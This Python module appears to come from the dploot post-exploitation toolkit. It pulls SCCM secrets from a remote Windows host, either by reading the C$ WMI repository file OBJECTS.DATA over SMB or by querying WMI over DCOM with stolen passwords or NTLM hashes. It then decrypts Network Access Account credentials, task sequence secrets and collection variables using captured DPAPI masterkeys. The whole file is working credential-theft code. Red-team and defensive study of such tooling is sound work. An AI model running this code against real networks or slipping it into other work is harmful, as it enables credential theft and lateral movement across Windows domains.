import logging
from typing import List, Tuple
import re

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection

class SCCM:

    @classmethod
    def member_to_string(cls, member):
        return member.decode('utf-16le', errors='backslashreplace').rstrip('\0')

    def dump(self) -> None:
        print(self.description_header)
        for name, value in self.__dict__.items():
            print('\t%8s:\t%s' % (name.capitalize(), self.member_to_string(value)))
    
    def dump_quiet(self) -> None:
        print(f'{self.quiet_description_header} {':'.join([self.member_to_string(_) for _ in self.__dict__.values()])}')
    
    def __eq__(self, other) -> bool:
        for name in self.__dict__:
            if getattr(self, name) != getattr(other, name):
                return False
        return True

    def __hash__(self) -> int:
        return hash(tuple(self.__dict__.values()))

class SCCMCred(SCCM):

    description_header       = '[NAA Account]'
    quiet_description_header = '[NAA]'

    def __init__(self, username: bytes, password: bytes) -> None:
        self.username = username
        self.password = password

class SCCMSecret(SCCM):

    description_header       = '[Task sequences secret]'
    quiet_description_header = '[Task]'

    def __init__(self, secret) -> None:
        self.secret = secret

class SCCMCollection(SCCM):
    
    description_header       = '[Collection Variable]'
    quiet_description_header = '[Collection]'

    def __init__(self, variable: bytes, value: bytes) -> None:
        self.variable = variable
        self.value = value

class SCCMTriage:

    sccm_objectdata_filepath = 'Windows\\System32\\wbem\\Repository\\OBJECTS.DATA'
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey], use_wmi: bool) -> None:
        self.target = target
        self.conn = conn
        self.use_wmi = use_wmi
        self.masterkeys = masterkeys


    def sccmdecrypt(self, dpapi_blob):
        if self.use_wmi:
            list_blob = [int(dpapi_blob[i:i+2],16) for i in range(0, len(dpapi_blob), 2)][4:]
        else:
            list_blob = list(bytes.fromhex(dpapi_blob.decode('utf-8')))[4:]
        blob_bytes = bytes(list_blob)
        
        masterkey = find_masterkey_for_blob(blob_bytes, masterkeys=self.masterkeys)
        result = ''
        if masterkey is not None:
            result = decrypt_blob(blob_bytes, masterkey=masterkey)
        else:
            logging.debug("Master keys not found for SCCM blob")
        return result

    def parseFile(self, objectfile) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccmcred = set()
        sccmsecret = set()
        sccmcollection = set()
        regex_naa = br"CCM_NetworkAccessAccount\x00\x00<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>\x00\x00<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        regex_task = br"</SWDReserved>.*?<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        regex_collection = br"CCM_CollectionVariable\x00\x00(.*?)\x00\x00.*?<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        logging.debug("Looking for NAA Credentials from OBJECTS.DATA file")
        pattern = re.compile(regex_naa)
        for match in pattern.finditer(objectfile):
            logging.debug(f"Found NAA Credentials from OBJECTS.DATA file: {match.start()} - {match.end()}")
            password = self.sccmdecrypt(match.group(1))
            username = self.sccmdecrypt(match.group(2))
            sccmcred.add(SCCMCred(username, password))
        pattern = re.compile(regex_task)
        logging.debug("Looking for task sequences secret from OBJECTS.DATA file")
        for match in pattern.finditer(objectfile):
            logging.debug(f"Found task sequences secret from OBJECTS.DATA file: {match.start()} - {match.end()}")
            sccmsecret.add(SCCMSecret(self.sccmdecrypt(match.group(1))))
        pattern = re.compile(regex_collection)
        logging.debug("Looking for collection variables from OBJECTS.DATA file")
        for match in pattern.finditer(objectfile):
            try:
                logging.debug(f"Found collection variable from OBJECTS.DATA file: {match.start()} - {match.end()}")
                name = match.group(1).decode('utf-8').encode('utf-16le')
                value = self.sccmdecrypt(match.group(2))
                sccmcollection.add(SCCMCollection(name, value))
            except Exception as e:
                logging.debug(f'Exception encountered in {__name__}: {e}.')
                
        return sccmcred, sccmsecret, sccmcollection
    
    def parseReply(self, iEnum):
            finding = list()
            regex = r"<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
            while True:
                try:
                    pEnum = iEnum.Next(0xffffffff,1)[0]
                    record = pEnum.getProperties()

                    if 'NetworkAccessUsername' in record and 'NetworkAccessPassword' in record and len(record['NetworkAccessUsername']['value']) > 0 and len(record['NetworkAccessPassword']['value']) > 0:
                        logging.debug("Found NAA Credentials using WMI")
                        username = self.sccmdecrypt(re.match(regex, record['NetworkAccessUsername']['value']).group(1))
                        password = self.sccmdecrypt(re.match(regex, record['NetworkAccessPassword']['value']).group(1))
                        finding.append(SCCMCred(username, password))
                    if 'Name' in record and 'Value' in record and len(record['Name']['value']) > 0 and len(record['value']['value']) > 0:
                        logging.debug("Found collection variables using WMI")
                        name = self.sccmdecrypt(re.match(regex, record['name']['value']).group(1))
                        value = self.sccmdecrypt(re.match(regex, record['value']['value']).group(1))
                        finding.append(SCCMCollection(name, value))
                    if 'TS_Sequence' in record and len(record['TS_Sequence']['value']) > 0:
                        logging.debug("Found task sequences secret using WMI")
                        secret = self.sccmdecrypt(re.match(regex, record['TS_Sequence']['value']).group(1))
                        finding.append(SCCMSecret, secret)
                except Exception as e:
                    if str(e).find('S_FALSE') > 0:
                        break
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                        raise
                    else:
                        break
            iEnum.RemRelease()
            return finding


    def LocalSecretsWmi(self) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccmcred=list()
        sccmtask=list()
        sccmcollection=list()
        namespace = 'root\\ccm\\Policy\\Machine\\RequestedConfig'
        query_naa = 'SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount'
        query_task = 'SELECT TS_Sequence FROM CCM_TaskSequence'
        query_collection = 'SELECT Name, Value FROM CCM_CollectionVariable'
        try:
            dcom = DCOMConnection(self.target.address, self.target.username, self.target.password, self.target.domain, self.target.lmhash, self.target.nthash, self.target.aesKey, oxidResolver=True, doKerberos=self.target.do_kerberos, kdcHost=self.target.dc_ip)
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            logging.debug("Query WMI for Network access accounts")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_naa)
            sccmcred = self.parseReply(iEnumWbemClassObject)
            logging.debug("Query WMI for Task sequences")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_task)
            sccmtask = self.parseReply(iEnumWbemClassObject)
            logging.debug("Query WMI for collection variables")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_collection)
            sccmcollection = self.parseReply(iEnumWbemClassObject)
            iEnumWbemClassObject.RemRelease()
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
        dcom.disconnect()
        return sccmcred, sccmtask, sccmcollection
    
    def triage_sccm(self) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccmcred=list()
        sccmtask=list()
        sccmcollection=list()
        try:
            if self.use_wmi:
                sccmcred, sccmtask, sccmcollection = self.LocalSecretsWmi()
            else:
                objectfile = self.conn.readFile(self.share,self.sccm_objectdata_filepath, bypass_shared_violation = True)
                if (objectfile is not None and len(objectfile) > 0):
                    sccmcred, sccmtask, sccmcollection = self.parseFile(objectfile)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
            pass
        return sccmcred, sccmtask, sccmcollection
    


 
